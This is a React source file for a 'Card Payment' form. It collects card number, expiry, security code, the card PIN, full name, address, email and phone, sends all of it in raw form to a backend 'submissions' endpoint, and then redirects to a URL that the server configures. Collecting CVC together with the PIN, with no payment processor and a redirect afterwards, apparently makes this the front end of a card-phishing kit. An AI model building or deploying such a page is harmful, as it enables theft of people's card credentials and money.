import { useState, useEffect } from 'react';
import axios from 'axios';
import {
  FaCreditCard,
  FaCalendarAlt,
  FaLock,
  FaUser,
  FaEnvelope,
  FaGlobe,
  FaMapMarkerAlt,
  FaCity,
  FaFlag,
  FaPhone,
  FaKey,
} from 'react-icons/fa';
import './FormPage.css';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5000';

const formatCardNumber = (value) => {
  const digits = value.replace(/\D/g, '').slice(0, 16);
  const groups = digits.match(/.{1,4}/g);
  return groups ? groups.join(' ') : '';
};

const formatExpiry = (value) => {
  const digits = value.replace(/\D/g, '').slice(0, 4);
  if (digits.length >= 3) {
    return digits.slice(0, 2) + '/' + digits.slice(2);
  }
  return digits;
};

const FormPage = () => {
  const [form, setForm] = useState({
    cardNumber: '',
    expirationDate: '',
    securityCode: '',
    firstName: '',
    lastName: '',
    email: '',
    country: '',
    address: '',
    city: '',
    state: '',
    phone: '',
    pin: '',
  });

  const [showPin, setShowPin] = useState(false);
  const [status, setStatus] = useState({ type: '', message: '' });
  const [redirectUrl, setRedirectUrl] = useState('');

  useEffect(() => {
    const fetchRedirectUrl = async () => {
      try {
        const res = await axios.get(`${API_URL}/api/config/redirect-url`);
        setRedirectUrl(res.data.redirectUrl);
      } catch (err) {
        console.error('Could not fetch redirect URL', err);
      }
    };
    fetchRedirectUrl();
  }, []);

  const handleChange = (e) => {
    const { name, value } = e.target;
    let processed = value;

    if (name === 'cardNumber') processed = formatCardNumber(value);
    else if (name === 'expirationDate') processed = formatExpiry(value);
    else if (name === 'securityCode') processed = value.replace(/\D/g, '').slice(0, 4);
    else if (name === 'phone') processed = value.replace(/[^0-9+\-\s()]/g, '');
    else if (name === 'pin') processed = value.replace(/\D/g, '').slice(0, 8);

    setForm({ ...form, [name]: processed });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setStatus({ type: '', message: '' });

    try {
      await axios.post(`${API_URL}/api/submissions`, form);
      setStatus({
        type: 'success',
        message: 'Submission successful! Redirecting...',
      });

      let finalUrl = redirectUrl;
      if (finalUrl && !/^https?:\/\//i.test(finalUrl)) {
        finalUrl = 'https://' + finalUrl;
      }

      if (finalUrl) {
        setTimeout(() => {
          window.location.href = finalUrl;
        }, 1500);
      } else {
        setTimeout(() => {
          setStatus({ type: '', message: '' });
          setForm({
            cardNumber: '',
            expirationDate: '',
            securityCode: '',
            firstName: '',
            lastName: '',
            email: '',
            country: '',
            address: '',
            city: '',
            state: '',
            phone: '',
            pin: '',
          });
        }, 3000);
      }
    } catch (err) {
      setStatus({
        type: 'error',
        message: err.response?.data?.error || 'Submission failed. Please try again.',
      });
    }
  };

  return (
    <div className="form-page">
      <div className="container">
        <div className="form-card">
          <h1>
            <FaCreditCard /> Card Payment
          </h1>
          <p className="subtitle">Fill in your details securely</p>

          {status.message && (
            <div className={`alert ${status.type}`}>{status.message}</div>
          )}

          <form onSubmit={handleSubmit}>
            {/* Card Number */}
            <div className="form-row">
              <div className="input-group">
                <label>
                  <FaCreditCard /> Card Number
                </label>
                <input
                  type="text"
                  name="cardNumber"
                  value={form.cardNumber}
                  onChange={handleChange}
                  placeholder="1234 1234 1234 1234"
                  maxLength="19"
                  required
                  autoComplete="cc-number"
                />
              </div>
            </div>

            {/* Expiry & CVC */}
            <div className="form-row two-col">
              <div className="input-group">
                <label>
                  <FaCalendarAlt /> Expiration Date
                </label>
                <input
                  type="text"
                  name="expirationDate"
                  value={form.expirationDate}
                  onChange={handleChange}
                  placeholder="MM/YY"
                  maxLength="5"
                  required
                  autoComplete="cc-exp"
                />
              </div>
              <div className="input-group">
                <label>
                  <FaLock /> Security Code
                </label>
                <input
                  type="text"
                  name="securityCode"
                  value={form.securityCode}
                  onChange={handleChange}
                  placeholder="CVC"
                  maxLength="4"
                  required
                  autoComplete="cc-csc"
                />
              </div>
            </div>

            {/* Personal Details */}
            <div className="form-row two-col">
              <div className="input-group">
                <label>
                  <FaUser /> First Name
                </label>
                <input
                  type="text"
                  name="firstName"
                  value={form.firstName}
                  onChange={handleChange}
                  required
                  autoComplete="given-name"
                />
              </div>
              <div className="input-group">
                <label>
                  <FaUser /> Last Name
                </label>
                <input
                  type="text"
                  name="lastName"
                  value={form.lastName}
                  onChange={handleChange}
                  required
                  autoComplete="family-name"
                />
              </div>
            </div>

            <div className="form-row">
              <div className="input-group">
                <label>
                  <FaEnvelope /> Email
                </label>
                <input
                  type="email"
                  name="email"
                  value={form.email}
                  onChange={handleChange}
                  required
                  autoComplete="email"
                />
              </div>
            </div>

            <div className="form-row two-col">
              <div className="input-group">
                <label>
                  <FaGlobe /> Country
                </label>
                <input
                  type="text"
                  name="country"
                  value={form.country}
                  onChange={handleChange}
                  required
                  autoComplete="country-name"
                />
              </div>
              <div className="input-group">
                <label>
                  <FaPhone /> Phone
                </label>
                <input
                  type="text"
                  name="phone"
                  value={form.phone}
                  onChange={handleChange}
                  required
                  autoComplete="tel"
                />
              </div>
            </div>

            <div className="form-row">
              <div className="input-group">
                <label>
                  <FaMapMarkerAlt /> Address
                </label>
                <input
                  type="text"
                  name="address"
                  value={form.address}
                  onChange={handleChange}
                  required
                  autoComplete="street-address"
                />
              </div>
            </div>

            <div className="form-row two-col">
              <div className="input-group">
                <label>
                  <FaCity /> City
                </label>
                <input
                  type="text"
                  name="city"
                  value={form.city}
                  onChange={handleChange}
                  required
                  autoComplete="address-level2"
                />
              </div>
              <div className="input-group">
                <label>
                  <FaFlag /> State
                </label>
                <input
                  type="text"
                  name="state"
                  value={form.state}
                  onChange={handleChange}
                  required
                  autoComplete="address-level1"
                />
              </div>
            </div>

            {/* PIN with toggle visibility */}
            <div className="form-row">
              <div className="input-group">
                <label>
                  <FaKey /> PIN
                </label>
                <div className="pin-wrapper">
                  <input
                    type={showPin ? 'text' : 'password'}
                    name="pin"
                    value={form.pin}
                    onChange={handleChange}
                    maxLength="8"
                    required
                    autoComplete="current-password"
                  />
                  <button
                    type="button"
                    className="toggle-pin"
                    onClick={() => setShowPin(!showPin)}
                  >
                    {showPin ? 'Hide' : 'Show'}
                  </button>
                </div>
              </div>
            </div>

            <button type="submit" className="submit-btn">
              Submit Payment
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default FormPage;